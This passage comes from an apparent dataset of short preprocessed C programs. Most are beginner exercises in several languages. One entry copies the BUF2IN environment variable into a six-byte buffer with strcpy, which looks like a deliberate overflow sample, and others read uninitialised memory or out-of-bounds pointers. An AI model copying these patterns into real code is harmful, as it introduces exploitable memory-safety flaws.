\"Etiam non quam lacus suspendisse faucibus interdum posuere. Eget sit amet tellus cras adipiscing enim eu turpis egestas. \"\n   \"Lectus magna fringilla urna porttitor rhoncus dolor purus non. Sit amet consectetur adipiscing elit duis tristique sollicitudin nibh. \"\n   \"Nec tincidunt praesent semper feugiat nibh. Sapien pellentesque habitant morbi tristique senectus et netus et malesuada.\";\n if (sem_init(&sem, 0, 1))\n  err_exit(\"sem_open() error\");\n pthread_t threads[2];\n void *(*thread_funcs[2])(void *arg);\n thread_funcs[0] = analyze_even;\n thread_funcs[1] = analyze_odd;\n for (int i = 0; i < 2; i++) {\n  if (pthread_create(&threads[i], ((void*)0), &(*thread_funcs[i]), content))\n   err_exit(\"pthread_create() error\");\n }\n for (int i = 0; i < 2; i++) {\n  if (pthread_join(threads[i], ((void*)0)))\n   err_exit(\"pthread_join() error\");\n }\n for (int i = 0; i < 256; i++)\n  printf(\"frequenza di %d = %d \\n\", i, counter[i]);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nchar msg[] = {76, 101, 116, 116, 104, 101, 98, 101, 115, 116, 115, 116, 97,\n    114, 116, 117, 112, 115, 97, 112, 112, 108, 121, 116, 111, 121, 111, 117, 0};\nint main (void) {\n    fprintf ((stderr), \"%s\\n\", msg);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int n,rev = 0,t,rem;\n printf(\"enter a number\\n \");\n scanf(\"%d\",&n);\n t =n;\n while(n!=0){\n  rem = n%10 ;\n     rev = rev*10 + rem;\n     n = n/10;\n }\n printf(\"reverse number is %d\\n\",rev);\n     if(t==rev)\n      printf(\"number is palindrome\\n\");\n     else\n      printf(\"number is not palindrome\\n\");\n     return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int n;\n  printf(\"Entre com um inteiro: \");\n  scanf(\"%d\", &n);\n  printf(\"%d \u00e9 \", n);\n  if (n % 2) printf(\"\u00edmpar e \");\n  else printf(\"par e \");\n  if (n < 0) printf(\"negativo.\\n\");\n  else printf(\"positivo.\\n\");\n  return 0;\n}",
    "#include <unistd.h>\n#include <pthread.h>\n#include <stdio.h>\nint x, y, r1, r2;\nvoid thread0()\n{\n    x = 1;\n    y = 1;\n}\nvoid thread1()\n{\n    r1 = y;\n    r2 = x;\n}\nint main()\n{\n    {\n        pthread_t t1, t2;\n        x = y = r1 = r2 = 0;\n        pthread_create(&t1, ((void*)0), (void *)thread0, ((void*)0));\n        pthread_create(&t2, ((void*)0), (void *)thread1, ((void*)0));\n        pthread_join(t1, ((void*)0));\n        pthread_join(t2, ((void*)0));\n        if (r1 == 1 && r2 == 0) {\n            printf(\"error\\n\");\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nvoid foo(void)\n{\n    printf(\"Normal situ\\n\");\n\n\n\n    return;\n}\nint main()\n{\n    foo();\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int integer1 = 0;\n    int integer2 = 0;\n    int Sum;\n    int SUM;\n    int sum_of_two_integers = 0;\n    int sumOfTwoIntegers = 0;\n    printf(\"Enter first integer\\n\");\n    scanf(\"%d\", &integer1);\n    printf(\"Enter second integer\\n\");\n    scanf(\"%d\", &integer2);\n    int sum = integer1 + integer2;\n    printf(\"Sum is %d\\n\", sum);\n    printf(\"%d + %d = %d\\n\", integer1, integer2, integer1 + integer2);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char const *argv[])\n{\n    int scores[3];\n    for (int i = 0; i < 3; i++)\n    {\n        printf(\"%i\\n\", scores[i]);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n printf(\"a to num: %d\", (int)'a');\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int a = 5;\n int *p;\n p = &a;\n printf(\"%d\\n\", *p);\n printf(\"%p\\n\", p);\n printf(\"\\n\");\n *p = *p + 1;\n printf(\"%d\\n\", *p);\n printf(\"%p\\n\", p);\n printf(\"\\n\");\n p = p + 1;\n printf(\"%d\\n\", *p);\n printf(\"%p\\n\", p);\n printf(\"\\n\");\n p = p + 1000000;\n printf(\"%d\\n\", *p);\n printf(\"%p\\n\", p);\n printf(\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <memory.h>\nint main(void)\n{\n int n;\n scanf(\"%d\", &n);\n int i, j;\n int dp[502];\n int num[502];\n memset(dp,0,sizeof(dp));\n memset(num,0,sizeof(num));\n for(i=0;i<n;i++)\n {\n  for(j=0;j<i+1;j++)\n   scanf(\"%d\", &num[j]);\n  for(j=i;j>0;j--)\n  {\n   dp[j] = (dp[j-1] > dp[j]) ? dp[j-1] : dp[j];\n   dp[j] += num[j];\n  }\n  dp[0] = dp[0] + num[0];\n }\n int max = 0;\n for(i=0;i<n;i++)\n  if(max < dp[i]) max = dp[i];\n printf(\"%d\\n\", max);\n return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nchar *apply_rules(char *new_sl, const char *sl, size_t width)\n{\n int i;\n new_sl[0]=(sl[0] || sl[1]);\n new_sl[width-1]=(sl[width-2] || sl[width-1]);\n for(i=1; i<width-1; ++i) {\n  char t1 = (sl[i-1] && sl[i] && sl[i+1]);\n  char t2 = (!sl[i-1] && !sl[i] && !sl[i+1]);\n  new_sl[i]=!(t1 || t2);\n }\n return new_sl;\n}\nvoid print_statelist(const char *sl, size_t width)\n{\n int i;\n for(i=0; i<width; ++i) putchar(sl[i]?'@':' ');\n putchar('\\n');\n}\n\nvoid run_and_display(size_t niters)\n{\n char statelist1[80];\n char statelist2[80];\n char *statelist, *new_statelist;\n int i;\n memset(statelist1, 0, 80);\n statelist1[80/2]=1;\n statelist=statelist1;\n new_statelist=statelist2;\n for(i=0; i<niters; ++i) {\n  print_statelist(statelist, 80);\n  if((statelist=apply_rules(new_statelist, statelist, 80))==statelist1)\n   new_statelist=statelist2;\n  else\n   new_statelist=statelist1;\n }\n}\nint main()\n{\n run_and_display(2);\n return 0;\n}",
    "#include<stdio.h>\nint main(int argc, char *argv[])\n{\n    int n,k,x,i,count=0;\n    scanf(\"%d %d\",&n,&k);\n    int ara[n];\n    for(i=0;i<n;i++)\n    {\n        scanf(\"%d\",&ara[i]);\n    }\n    for(i=0;i<n;i++)\n    {\n        if(ara[i]>=ara[k-1]&& ara[i]!=0)\n        count++;\n    }\n    printf(\"%d\",count);\nreturn 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int sum = 0, trigo = 1, casas = 64;\n    for (int i = 1; i <= casas; i++)\n    {\n        sum = trigo * 2;\n        trigo += sum;\n    }\n    printf(\"A rainha pagara pelo servi\u00e7o %d gr\u00e3os de trigo.\\n\", trigo);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(int argc, char *argv[]) {\n    FILE *fp;\n    int data = 0, stack = 0;\n    char buf[2048];\n    char *vm;\n    fp = fopen(\"/proc/1/status\", \"r\");\n    if (fp == ((void*)0))\n        exit(1);\n    fread(buf, 2047, 1, fp);\n    buf[2047] = '\\0';\n    fclose(fp);\n    vm = strstr(buf, \"VmData:\");\n    if (vm) {\n        sscanf(vm, \"%*s %d\", &data);\n    }\n    vm = strstr(buf, \"VmStk:\");\n    if (vm) {\n        sscanf(vm, \"%*s %d\", &stack);\n    }\n    printf(\"data(%d) + stack(%d) = total(%d)\\n\", data, stack, data + stack);\n    exit(0);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    char ASCII;\n    printf(\"Please enter a character: \");\n    scanf(\"%c\", &ASCII);\n    printf(\"ASCII code is: %i\\n\",ASCII);\n    int integer;\n    printf(\"Please enter an integer(ASCII code) between 0-127 :\");\n    scanf(\"%i\",&integer);\n    printf(\"Character is :%c\\n\",integer);\n    char mathz='A'+'\\t';\n    printf(\"A(65) + \\\\t(11) = %c(%d)\\n\", mathz, mathz);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n int n, n_maior = 0, posicao, i;\n for (i = 1; i <= 100; i++) {\n  scanf(\"%d\", &n);\n  if (n > n_maior) {\n   n_maior = n;\n   posicao = i;\n  }\n }\n printf(\"%d\\n%d\\n\", n_maior, posicao);\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n int i=1, j=60;\n printf(\"I=%d J=%d\\n\", i, j);\n while(j!=0){\n i += 3;\n j -= 5 ;\n printf(\"I=%d J=%d\\n\", i, j);\n}\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int num = 7;\n int *pointer = &num;\n printf(\"num = 0x%x\\n\", num);\n printf(\"pointer = 0x%x\\n\", pointer);\n printf(\"*pointer = 0x%x\\n\", *pointer);\n printf(\"&pointer = 0x%x\\n\", &pointer);\n return 0;\n}",
    "#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\nunsigned long long number_of_paths(int N)\n{\n    unsigned long long path = 1;\n    for (int i = 0; i < N; i++)\n    {\n        path *= (N << 1) - i;\n        path /= i + 1;\n    }\n    return path;\n}\nint main(int argc, char **argv)\n{\n    int N = 20;\n    if (argc == 2)\n        N = atoi(argv[1]);\n    printf(\"Number of ways to traverse diagonal of %dx%d grid = %llu\\n\", N, N,\n           number_of_paths(N));\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int x, y, z;\n  int *p;\n  x = 4;\n  y = 6;\n  z = 8;\n  p = &x;\n  printf(\"The address x is %x\\n\",(int)p);\n  printf(\"The address y is %d\\n\",(int)&y);\n  printf(\"The address z is %d\\n\",(int)&z);\n  *p = *p + 1;\n  printf(\"The value of x now is %d\\n\", x);\n  p -= 1;\n  printf(\"p is now %x\\n\", (int) p);\n  printf(\"The value pointed to by p is now %d\\n\", *p);\n  return 0;\n}",
    "int main(){\n    int i = 0;\n    loop:\n    i++;\n    if(i<10)\n        goto loop;\n    return i;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void)\n{\n int c = 32;\n printf(\"0x%x\\n\",c);\n if(c == rand())\n   printf(\"Succsess!\\n\");\n return 0;\n}",
    "#include<stdlib.h>\n#include<string.h>\n#include<stdio.h>\nint swap(void *x, void *y, int size)\n{\n    void *tmp;\n    if((tmp = malloc(size)) == ((void*)0))\n        return -1;\n    memcpy(tmp, x, size); memcpy(x, y, size); memcpy(y, tmp, size);\n    free(tmp);\n    return 0;\n}\nint main()\n{\n    int s;\n    int a = 3;\n    int b = 7;\n    printf(\"a:%d\\n\", a);\n    printf(\"b:%d\\n\", b);\n    s = sizeof(s);\n    swap(&a, &b, s);\n    printf(\"a:%d\\n\", a);\n    printf(\"b:%d\\n\", b);\n}",
    "int main(){80-50 > 20*2;}",
    "int f(int var1, int var2)\n{\n int y = var1+var2;\n y = y+2;\n return y;\n}\nint main()\n{\n  int a=0;\n  int x;\n  if(x<0){\n    x=0;\n    a = f(x, a);\n  }\n  else\n  {\n    a = f(x,a);\n  }\n  a++;\n  if(a<3){\n    ERROR: return -1;\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int a, b, c;\n scanf(\"%d %d %d\", &a, &b, &c);\n if(c<=b)\n {\n  printf(\"-1\\n\");\n  return 0;\n }\n printf(\"%d\\n\", a/(c-b) + 1);\n return 0;\n}",
    "#include<stdio.h>\nlong fact (int);\nlong r_fact (int);\nint main(void)\n{\n   int num;\n   printf(\"This program calculates factorials.\\n\");\n   printf(\"Enter a value in the range 0-12 (q to quit): \\n\");\n   while(scanf(\"%d\", &num) == 1)\n   {\n       if(num < 0 )\n           printf(\"No negative numbers, please.\\n\");\n       else if(num > 12)\n           printf(\"Keep input under 13.\\n\");\n       else\n       {\n            printf(\"loop: %d factorial = %ld\\n\", num, fact(num));\n            printf(\"recursion: %d factorial = %ld\\n\", num, r_fact(num));\n       }\n       printf(\"Enter a value in the range 0-12 (q to quit): \\n\");\n   }\n   printf(\"Bye.\\n\");\n   return 0;\n}\nlong fact(int n)\n{\n    long ans;\n    for(ans = 1; n > 1; n--)\n        ans *= n;\n    return ans;\n}\nlong r_fact(int n)\n{\n    long ans;\n    if(n > 0)\n        ans = n * r_fact(n - 1);\n    else\n        ans = 1;\n    return ans;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\n  const char* inEnv = getenv(\"BUF2IN\");\n  if (inEnv == ((void*)0)) {\n    printf(\"BUF2IN environment variable not set.\");\n    return -1;\n  }\n  char c[6];\n  strcpy(c, inEnv);\n  printf(\"First argument is: %s\\n\", c);\n  return 0;\n}",
    "#include <stdio.h>\nint a[100000],b[100000],c[100000];\nint enterarr(int p[],int n)\n{\n int i,sum=0;\n for(i=0;i<n;i++)\n {\n  scanf(\"%d\",&p[i]);\n  sum+=p[i];\n }\n return sum;\n}\nint max(int a,int b)\n{\n int m;\n if(a>=b)\n  m=a;\n else\n  m=b;\n return m;\n}\nint main()\n{\n int t;\n scanf(\"%d\",&t);\n int suma=0;\n int sumb=0;\n int sumc=0;\n int n;\n while(t--)\n {\n  scanf(\"%d\",&n);\n  int i=n;\n  suma=enterarr(a,n);\n  scanf(\"%d\",&n);\n  int j=n;\n  sumb=enterarr(b,n);\n  scanf(\"%d\",&n);\n  int k=n;\n  sumc=enterarr(c,n);\n  int m;\n  while(suma!=sumb || suma!=sumc || sumb!=sumc)\n  {\n  m=max(suma,max(sumb,sumc));\n   if(m==suma)\n   {\n    suma-=a[i-1];\n    i--;\n   }\n   else if(m==sumb)\n   {\n    sumb-=b[j-1];\n    j--;\n   }\n   else if(m==sumc)\n   {\n    sumc-=c[k-1];\n    k--;\n   }\n  }\n  printf(\"%d\\n\",suma);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int i,x;\n i=0;\n x=i++;\n printf(\"Post increment: i=0, x=i++ i = %i x = %i\\n\",i,x);\n i=0;\n x=++i;\n printf(\"Pre increment: i=0, x=++i i = %i x = %i\\n\",i,x);\n i=0;\n x=i--;\n printf(\"Post decrement: i=0, x=i-- i = %i x = %i\\n\",i,x);\n i=0;\n x=--i;\n printf(\"Pre decrement: i=0, x=--i i = %i x = %i\\n\",i,x);\n i = 5;\n i+=2;\n printf(\"Plus Compound: i=5, i+=2 Result:  %i\\n\",i);\n i = 25;\n i %= 7;\n printf(\"25%%7 i=%i\\n\",i);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid shell(int n, int a[])\n{\n int s;\n for (int i=n/2; i>0; i=i/2)\n {\n  for (int j=i; j<n; j++)\n  {\n   for(int k=j-i; k>=0; k=k-i)\n   {\n    if (a[k+i]<=a[k])\n    {\n     s=a[k];\n     a[k]=a[k+i];\n     a[k+i]=s;\n    }else break;\n   }\n  }\n }\n}\nint main ()\n{\n int n;\n int *a;\n scanf(\"%d\", &n);\n a=(int *)calloc(n, sizeof(int));\n for (int i=0; i<n; i++)\n {\n  scanf(\"%d\", &a[i]);\n }\n shell(n,a);\n for(int i=0; i<n; i++)\n {\n  printf(\"%d \", (a[i]));\n }\n printf(\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint promedio(int x);\nint main()\n{\n  int n;\n  printf(\"Ingrese el total de numeros: \");\n  scanf(\"%i\", &n);\n  promedio(n);\n  return 0;\n}\nint promedio(int x)\n{\n  int i, marks[10], prom, sum=0;\n  for(i=0; i<x; ++i)\n    {\n      printf(\"Ingrese un numero%i: \",i+1);\n      scanf(\"%d\", &marks[i]);\n      sum += marks[i];\n    }\n  prom = sum/x;\n  printf(\"Promedio = %d\\n\", prom);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int numero_inicial;\n    int cont;\n    cont =0;\n    printf(\"qual e o primeiro numera d sequencia?\");\n    scanf(\"%d\",&numero_inicial);\n    while( cont < 10)\n    {\n        printf(\"\\n %d\",cont);\n        cont = cont +1;\n    }\n    if(cont > numero_inicial)\n    {\n        printf(\"%d e menor\",numero_inicial);\n    }else\n    {\n        printf(\"%d e maior\",numero_inicial);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *args[]){\n    printf(\"An das Programm wurden folgende Argumente \u00fcbergeben: \\n\");\n    for(int i = 0; i < argc; i ++){\n        printf(\"args[%d]: %s\\n\", i, args[i]);\n    }\n    return 0;\n}",
    "int main(){\n  return 0xff;\n}",
    "#include <stdio.h>\nint main(void) {\n  unsigned n;\n  printf(\"Quantos elementos de Fibonacci pretende? (N>=0) \");\n  scanf(\"%u\", &n);\n  unsigned long fib1 = 0, fib2 = 1, aux;\n  for (; n > 0; n--) {\n    printf(\"%lu \", fib2);\n    aux = fib2;\n    fib2 += fib1;\n    fib1 = aux;\n  }\n  printf(\"\\n\");\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <string.h>\n#include <unistd.h>\n\nstatic char receive[4096];\nint main()\n{\n char stringToSend[4096];\n int ret, fd;\n fd = open(\"/dev/reverse\", ((0x04000000) | (0x10000000)));\n if (fd < 0) {\n  perror(\"failed to open device\");\n  return errno;\n }\n printf(\"type a string \\n\");\n scanf(\"%[^\\n]%*c\", stringToSend);\n printf(\"writing message [%s] \\n\", stringToSend);\n ret = write(fd, stringToSend, strlen(stringToSend));\n if (ret < 0) {\n  perror(\"failed to write message to device\");\n  return errno;\n }\n close(fd);\n fd = open(\"/dev/reverse\", ((0x04000000) | (0x10000000)));\n ret = read(fd, receive, 4096);\n if (ret < 0) {\n  perror(\"failed to read message from device\");\n  return errno;\n }\n printf(\"Message received: %s\\n\", receive);\n return (0);\n}",
    "#include <stdio.h>\nint main()\n{\nint n,i,a,sum;\nfloat avr;\ni=0;\nsum=0;\nscanf(\"%d\", &n);\ndo{\nscanf(\"%d\", &a);\nsum=a+sum;\ni++;\n}while(i<n);\navr=(float)sum/n;\nprintf(\"Sum: %d\", sum);\nprintf(\"\\nAvg: %.2f\", avr);\nreturn 0;\n}",
    "#include <stdio.h>\nint power(int x, int y){\n    int acumulador = 1;\n    for(int i=0; i<y; i++){\n        acumulador*=x;\n    }\n    return acumulador;\n}\nint main(){\n    int p = power(2, 1);\n    printf(\"%d\\n\", p);\n    p = power(2, 2);\n    printf(\"%d\\n\", p);\n    p = power(2, 3);\n    printf(\"%d\\n\", p);\n    p = power(2, 4);\n    printf(\"%d\\n\", p);\n    p = power(2, 5);\n    printf(\"%d\\n\", p);\n}",
    "#include <stdio.h>\nint main(int args, char** argsv)\n{\n int v[3];\n printf(\"Insira o primeiro valor: \");\n scanf(\"%i\", &v[0]);\n printf(\"Insira o segundo valor: \");\n scanf(\"%i\", &v[1]);\n printf(\"Insira o terceiro valor: \");\n scanf(\"%i\", &v[2]);\n for(int i = 0; i < 3; i++)\n {\n  if(v[i] % 2 == 0){\n   printf(\"O numero %i e par\\n\", v[i]);\n   continue;\n  }\n   printf(\"O numero %i e impar\\n\", v[i]);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n#include <string.h>\n_Bool func();\nint main(int argc, char const *argv[])\n{\n _Bool tmp;\n if((tmp = func()) == 1)\n {\n  printf(\"\u8fd9\u662f\u4e2a\u5c0f\u7aef\u5e8f\u673a\u5668\\n\");\n }\n else{\n  printf(\"\u8fd9\u662f\u4e2a\u5927\u7aef\u5e8f\u673a\u5668\\n\");\n }\n return 0;\n}\n_Bool func()\n{\n int a[2] = {1,2};\n char buf[50] = {0};\n int *p = (int *)((char*)a+1);\n sprintf(buf,\"%x\",*p);\n if(strcmp(buf,\"20000000\") == 0 ){\n  printf(\"1\\n\");\n  return 1;\n }\n if(strcmp(buf,\"100\") == 0 )\n {\n  printf(\"0\\n\");\n  return 0;\n }\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint pascalComb(int n, int r){\n    if(n==r || r==0)\n        return 1;\n    return pascalComb(n-1, r-1) + pascalComb(n-1, r);\n}\nint main(){\n    printf(\"5C3 = %d \\n\", pascalComb(5, 3));\n    return 0;\n}",
    "#include <stdio.h>\n\nint get_line(char s[], int lim);\nint get_line2(char s[], int lim);\nvoid copy(char from[], char to[]);\nint main()\n{\n char instring[1000], outstring[1000];\n get_line2(instring, 1000);\n copy(instring, outstring);\n printf(\"%s\",outstring);\n return 0;\n}\nvoid copy(char from[], char to[])\n{\n int i;\n i = 0;\n while ((to[i] = from[i]) != '\\0')\n  ++i;\n}\nint get_line(char s[], int lim)\n{\n int c, i;\n for (i = 0; i < lim - 1 && (c = getchar()) != (-1) && c != '\\n'; ++i)\n {\n  s[i] = c;\n }\n if (c == '\\n')\n {\n  s[i] = c;\n  ++i;\n }\n s[i] = '\\0';\n return i;\n}\nint get_line2(char s[], int lim)\n{\n int c,i;\n c = i = 0;\n while (i < lim - 1)\n {\n  c = getchar();\n  if (c != (-1))\n  {\n   if (c != '\\n')\n   {\n    s[i] = c;\n    ++i;\n   }\n   else if (c == '\\n')\n   {\n    s[i] = c;\n    s[i+1] = '\\0';\n    return i;\n   }\n  }\n } ++i;\n s[i+1] = '\\0';\n return i;\n}",
    "#include<stdio.h>\nint leftshift(int n, int b);\nint rightshift(int n, int b);\nint itob(int );\nint main()\n{\n int n, b, answer=0, lresult=0, rresult=0;\n printf(\"\\nEnter the number= n and bits= b : \");\n scanf(\"%d%d\", &n, &b);\n lresult = leftshift(n, b);\n return 0;\n}\nint leftshift(int n, int b)\n{\n int ans=0, num=0, a=0;\n num= itob(n);\n a = itob(2*n);\n ans = num<<b;\n ans= (ans)*(a);\n printf(\"\\nShifting a binary %d \\n\", a);\n return ans;\n}\nint rightshift(int n, int b)\n{\n int ans=0, num=0, count=0;\n num= itob(n);\n num = num<<b;\n return ans;\n}\nint itob(int num)\n{\n if(num == 0)\n    return 0;\n else\n           return (num%2 + 10*itob(num/2));\n}",
    "#include<stdio.h>\nlong long y(int,int);\nlong long x(int);\nint main()\n{\n    int n,m;\n    scanf(\"%d%d\",&m,&n);\n    if(n*m==0)\n        printf(\"0\\n\");\n        else\n    printf(\"%lld\\n\",y(m,n));\n return 0;\n }\nlong long y(int m,int n)\n{\n    return x(m)/(x(n)*x(m-n));\n}\nlong long x(int m)\n{\n    int i;\n    long long s=1;\n    for(i=2;i<=m;i++)\n        s*=i;\n    return s;\n}",
    "#include <stdio.h>\n\n\nvoid input_array(int rows, double arr[][5]);\ndouble col_average(int cols, const double arr[]);\ndouble array_average(int rows, const double arr[][5]);\ndouble array_max_number(int rows, const double arr[][5]);\nvoid show_result(int rows, const double arr[][5]);\nint main(void)\n{\n    double array[3][5];\n    input_array(3, array);\n    show_result(3, array);\n    printf(\"\\n\");\n    return 0;\n}\nvoid input_array(int rows, double arr[][5])\n{\n    printf(\"Enter the array number.\\n\");\n    for (int i = 0; i < rows; i++)\n    {\n        printf(\"Enter five double number seprate by enter:\\n\");\n        for (int j = 0; j < 5; j++)\n        {\n            scanf(\"%lf\", &arr[i][j]);\n        }\n    }\n    return;\n}\ndouble col_average(int cols, const double arr[])\n{\n    double sum = 0;\n    for (int i = 0; i < cols; i++)\n    {\n        sum += arr[i];\n    }\n    return sum/cols;\n}\ndouble array_average(int rows, const double arr[][5])\n{\n    double sum = 0;\n    for (int i = 0; i < rows; i++)\n    {\n        sum += col_average(5, arr[i]);\n    }\n    return sum / rows;\n}\ndouble array_max_number(int rows, const double arr[][5])\n{\n    double max = arr[0][0];\n    for (int i = 0; i < rows; i++)\n    {\n        for (int j = 0; j < 5; j++)\n        {\n            if (max < arr[i][j])\n            {\n                max = arr[i][j];\n            }\n        }\n    }\n    return max;\n}\nvoid show_result(int rows, const double arr[][5])\n{\n    printf(\"Now, Let\\'s check the array!\\n\");\n    printf(\"The array you input is:\\n\");\n    for (int i = 0; i < rows; i++)\n    {\n        for (int j = 0; j < 5; j++)\n        {\n            printf(\"%5g\", arr[i][j]);\n        }\n        printf(\"\\n\");\n    }\n    printf(\"The Average of every column is:\\n\");\n    for (int i = 0; i < rows; i++)\n    {\n        printf(\"The %d column's average is %g.\\n\", i, col_average(5, arr[i]));\n    }\n    printf(\"The array's data average is %g\\n\", array_average(3, arr));\n    printf(\"The max datum in the array is %g\", array_max_number(3, arr));\n    return;\n}",
    "#include <stdio.h>\nint main( )\n{\nint c, nl;\nnl = 0;\nwhile ((c = getchar()) != (-1)){\nif (c == '\\n');\n++ nl;\nprintf(\"%d\\n\", nl);\n}\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n FILE *in_file;\n char input_str[256];\n float input_flt[200] = {0};\n unsigned int float_count;\n int i;\n if (argc != 2) {\n  fprintf((stderr), \"Need an input file\\n\");\n  return 0;\n }\n if ((in_file = fopen(argv[1], \"r\")) == ((void*)0)) {\n  fprintf((stderr), \"Error opening filter tap file\\n\");\n }\n float_count = 0;\n while (fgets(input_str, sizeof(input_str), in_file)) {\n  if (input_str[0] == '#' || input_str[0] == '\\n') {\n   continue;\n  }\n  if (sscanf(input_str, \"%f\", &input_flt[float_count]) == (-1)) {\n   fprintf((stderr), \"Error scanning float filter tap\\n\");\n   break;\n  }\n  float_count++;\n }\n printf(\"Read in %d floats\\n\", float_count);\n fclose(in_file);\n for (i = 0; i < 200; i++) {\n  printf(\"Float[%d] = %e\\n\", i, input_flt[i]);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n printf(\"%c\",176);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\nint p;\np = sizeof(short int);\nprintf(\"%d\\n\",p);\nreturn 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int count = 0, sum = 0, *max = ((void*)0), num;\n    while (1) {\n        printf(\"\u5165\u529b%d: \", count + 1);\n        if (scanf(\"%d%*[^\\n]\", &num) != 1) break;\n        if (max != ((void*)0) && num < *max) break;\n        ++count;\n        sum += num;\n        max = &(int){num};\n    }\n    puts(\"\\n\u6607\u9806\u306e\u6570\u5024\u304c\u5165\u529b\u3055\u308c\u306a\u304b\u3063\u305f\u306e\u3067\u8aad\u307f\u53d6\u308a\u3092\u7d42\u4e86\u3057\u307e\u3059\u3002\\n\");\n    if (max != ((void*)0)) printf(\"\u6700\u5f8c\u306e\u5024 (\u304b\u3064\u6700\u5927\u5024) \u306f%d\u3067\u3059\u3002\\n\", *max);\n    printf(\"\u5165\u529b\u3055\u308c\u305f\u30c7\u30fc\u30bf\u6570\u306f%d\u3067\u3059\u3002\\n\", count);\n    printf(\"\u30c7\u30fc\u30bf\u306e\u5408\u8a08\u306f%d\u3067\u3059\u3002\\n\", sum);\n    return 0;\n}",
    "#include <stdio.h>\n\n\n\n\n\n\n\nint readBit(char* data, int bitoffset)\n{\n    data += bitoffset / 8;\n    bitoffset %= 8;\n    bitoffset = 7 - bitoffset;\n    return (((*data) >> (bitoffset)) & 1);\n}\nint ColumbusDecode(char* d)\n{\n    int bitoffset = 0;\n    int leadingZeroBits = -1;\n    int b;\n    for (b = 0; !b; leadingZeroBits++) {\n        b = readBit(d, bitoffset++);\n    }\n    int base = (1 << leadingZeroBits) - 1;\n    int code = 0, v;\n    for (int i = 0; i < leadingZeroBits; i++) {\n        code <<= 1;\n        v = readBit(d, bitoffset++);\n        {if (v > 0) ((code) |= (1 << (0))); else ((code) &= ~(1 << (0))); };\n    }\n    code += base;\n    return code;\n}\nvoid testcase()\n{\n    char data[] = {\n        0b10000000, 0b01000000, 0b01100000, 0b00100000, 0b00101000,\n        0b00110000, 0b00111000, 0b00010000, 0b00010010, 0b00010100,\n        0b00010110,\n    };\n    int v;\n    for (int i = 0; i < sizeof(data); i++) {\n        v = ColumbusDecode(data + i);\n        if (i != v) {\n            printf(\"error when decode data 0x%02x should be %d actually %d\\n\", data[i], i, v);\n            return;\n        }\n    }\n    printf(\"test case passed\\n\");\n}\nint main()\n{\n    testcase();\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main (){\n    int a, b, c;\n    float d;\n    scanf(\"%d\",&a);\n    scanf(\"%d\",&b);\n    scanf(\"%d\",&c);\n  d= c - ((3*a) + (2*b))\n  / (c - ( c*pow((a+b),2)/ sqrt(b) ));\n    printf (\"%f\",d);\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint sorting_shell(int *arr, int arr_len)\n{\n int tmp,shet=0,j;\n for (int d = arr_len / 2; d > 0; d=d/2)\n {\n  for (int i = d; i < arr_len; ++i)\n  {\n   tmp = arr[i];\n   for ( j = i; j >= d; j = j - d)\n   {\n    shet++;\n    if (tmp < arr[j - d])\n    {\n     arr[j] = arr[j - d];\n    }\n    else\n     break;\n   }\n   shet++;\n   arr[j] = tmp;\n  }\n }\n return shet;\n}\nint main()\n{\n int shet,n,*arr;\n scanf(\"%d\", &n);\n arr = (int*)malloc(n * sizeof(int));\n for (int i = 0; i < n; ++i)\n {\n  scanf(\"%d\", &arr[i]);\n }\n sorting_shell(arr, n);\n for (int i = 0; i < n-1; ++i)\n {\n  printf(\"%d \", arr[i]);\n }\n printf(\"%d\\n\", arr[n-1]);\n free(arr);\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n printf(\"Hello, World\\0\");\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n\n{ printf(\"%d + %d = %d\\n\", 0, 0, 0); } { printf(\"%d + %d = %d\\n\", 0, 1, 1); } { printf(\"%d + %d = %d\\n\", 1, 0, 1); } { printf(\"%d + %d = %d\\n\", 1, 1, 2); }\n\n  return 0;\n}",
